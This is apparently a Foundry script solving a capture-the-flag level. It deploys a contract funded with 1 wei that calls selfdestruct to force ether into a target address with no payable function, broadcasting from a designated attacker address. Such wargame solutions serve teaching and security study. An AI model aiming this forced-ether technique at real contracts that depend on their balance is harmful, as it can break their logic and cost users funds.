// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

contract ForceAttack is Constants {
    constructor() public payable {}

    function attack() public {
        selfdestruct(payable(FORCE_ADDRESS));
    }
    receive() external payable {}   
}

contract ForceAttacker is Constants, Script {

    function run() public {
        vm.startBroadcast(ATTACKER_ADDRESS);
        ForceAttack _attack = new ForceAttack{value: 1 wei}();
        _attack.attack();
        vm.stopBroadcast();
    }
}